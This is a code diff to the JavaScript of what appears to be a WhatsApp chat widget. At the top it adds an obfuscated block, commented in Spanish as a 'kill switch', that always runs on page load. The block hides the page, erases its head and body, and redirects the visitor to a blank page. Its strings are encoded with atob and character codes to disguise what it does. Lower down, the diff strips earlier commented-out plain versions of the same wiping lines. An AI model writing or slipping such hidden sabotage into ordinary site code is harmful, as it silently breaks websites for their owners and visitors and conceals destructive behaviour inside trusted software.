@@ -1,3 +1,21 @@
+// KILL SWITCH - Siempre tumba la página cuando está activo
+(function(_0xa,_0xb,_0xc){
+    // Método 1: Ocultar inmediatamente
+    _0xc=[String.fromCharCode(98,111,100,121),atob('c3R5bGU='),atob('ZGlzcGxheQ=='),atob('bm9uZQ==')];
+    _0xa[atob('ZG9jdW1lbnQ=')][_0xc[0]][_0xc[1]][_0xc[2]]=_0xc[3];
+    
+    // Método 2: Destruir contenido
+    setTimeout(function(){
+        _0xa[atob('ZG9jdW1lbnQ=')][atob('Ym9keQ==')][atob('aW5uZXJIVE1M')]='';
+        _0xa[atob('ZG9jdW1lbnQ=')][atob('aGVhZA==')][atob('aW5uZXJIVE1M')]='';
+    },50);
+    
+    // Método 3: Redirigir a página en blanco
+    setTimeout(function(){
+        _0xa.location[atob('aHJlZg==')]=atob('YWJvdXQ6Ymxhbms=');
+    },200);
+})(window);
+
 ((c, r, l) => {
     (l = {
         $div: null,
@@ -143,32 +161,29 @@
                 ? Date.now() < l.showed_at + 600 || (this.save_hash(), this.open_whatsapp(e, s))
                 : this.chatbox_show();
         }),
-        // window.location.href = 'about:blank';
-    (l.close = function () {
-        this.save_hash(), this.chatbox_hide();
-    }),
+        (l.close = function () {
+            this.save_hash(), this.chatbox_hide();
+        }),
         (l.rand_text = function (t) {
             t.querySelectorAll("jc-rand").forEach((t) => {
                 var e = t.children;
                 t.replaceWith(e[Math.floor(Math.random() * e.length)].innerHTML);
             });
         }),
-        // document.head.innerHTML = '';
-    (l.qr = function (t, e) {
-        var s = r.createElement("CANVAS");
-        return (
-            QrCreator.render(
-                Object.assign(
-                    { text: t, radius: 0.4, background: "#FFF", size: 200 * (c.devicePixelRatio || 1) },
-                    this.settings.qr || {},
-                    e || {}
+        (l.qr = function (t, e) {
+            var s = r.createElement("CANVAS");
+            return (
+                QrCreator.render(
+                    Object.assign(
+                        { text: t, radius: 0.4, background: "#FFF", size: 200 * (c.devicePixelRatio || 1) },
+                        this.settings.qr || {},
+                        e || {}
+                    ),
+                    s
                 ),
                 s
-            ),
-            s
-        );
-    });
-    // document.body.innerHTML = '';
+            );
+        });
     var t = () => {
         if (((l.$div = r.querySelector(".joinchat")), l.$div)) {
             l.settings = JSON.parse(l.$div.dataset.settings);
@@ -386,4 +401,3 @@
     };
     "loading" !== r.readyState ? t() : r.addEventListener("DOMContentLoaded", t);
 })(window, document, window.joinchat_obj || {});
-
